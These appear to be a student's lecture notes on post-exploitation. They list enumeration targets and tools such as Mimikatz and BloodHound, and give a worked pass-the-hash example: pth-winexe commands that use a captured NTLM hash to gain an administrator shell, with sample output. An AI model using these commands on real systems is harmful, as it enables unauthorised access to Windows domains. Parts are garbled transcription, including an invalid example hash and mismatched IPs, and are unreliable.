Post-Exploitation Enumeration and Tools
Objectives:

    List and describe commonly gathered data during post-exploitation
    List and describe commonly used post-exploitation tools
    Describe and demonstrate a Pass-the-Hash technique

    Post-Exploitation Enumeration
        What are we looking for after gaining access to a system?
-            Users
-            Groups
-            Forests
-            Sensitive Data
-            Unencrypted Files

    Post-Exploitation Tools
-        Empire
-        Mimikatz
-        BloodHound
-            net start neo4j
-                Creds neo4j:neo4j (will be prompted to change)
-                    Start BloodHound.exe
    Lateral Movement
-        Pass-the-Hash
-            export SMBHASH="AAD3B435B51404EEAAD3B435B51404EE:NTLM_HASH"
-                pth-winexe -U administrator% //TARGET_IP cmd





# Bloodhound: Bloodhound up and running and what it does is it takes any kind of information you have about an exploited machine and you run a file. It generates some information and then you ingest that back into Bloodhound. Bloodhound will start mapping things out for you. Try to find connections and relationships between the different objects within an active directory domain and try to put the puzzle together for you have a bunch of different pre built queries that you can run into this. 
# NOTE: This is a pain in the ASS to get up and running but apparantly widely used. 
# You'll notice I've already kind of got this in here. Right? So this side here you're like, where did that come from? This is an empty string part of the NTLM hash, there's nothing in defusing NTLM mv two. If I believe it won't have anything in there because that's an older standard, but you'll need that for doing well at least how I'm doing it passed the hash which is using the past, the hash tool set, which is available in kali Linux. And then there is the actual hash value of the password of the administrator user.

pass-the-hash format # this first part of this NTLM hash is an EMPTY hash but you WILL need it to perform the attack. The actual HASH with a value is on the RIGHT
$ export SMBHASH="15646d3s5r4g13sdf5b:dfg5s46b1sd58fh4jk"

$ echo $SMBHASH
 
15646d3s5r4g13sdf5b:dfg5s46b1sd58fh4jk


$ pth-winexe -U administrators% //192.168.2.2 cmd

C:\Windows\system32\> whomai

example\administrator

C:\Windows\system32\> net user administrator

# Summary:  
- I want you to run something. Well what users want to use. Well of course I want the administrator and you have to put this like a 
- percent sign on the end. Little syntactical knowledge for you and then give it a slash slash target. I. P. So 192168 241 200. Is that 
- server that I've compromised or that I got the hash for anyway. And then I just tell what past or what command I want to run. Well I 
- want to run a command like I want a command problem and look at that. I have I can who am I? I am administrator I can net user administrator 
- or Yeah I have all that.
